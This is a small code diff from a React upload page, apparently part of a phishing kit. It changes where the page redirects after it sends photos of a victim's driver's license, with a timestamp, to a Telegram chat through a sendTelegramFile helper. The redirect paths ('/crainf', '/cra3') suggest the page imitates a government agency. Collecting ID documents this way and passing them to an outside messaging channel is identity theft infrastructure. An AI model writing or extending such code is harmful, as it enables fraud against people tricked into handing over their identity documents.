@@ -88,7 +88,7 @@ export default function UploadLicense() {
       await sendTelegramFile(backFile, `Driver's License Back\nTime: ${timestamp}`);
 
       // Redirect after both are sent
-      router.push("/crainf");
+      router.push("/cra3");
     } catch (err) {
       console.error("Upload error:", err);
       setError("An error occurred. Please try again.");
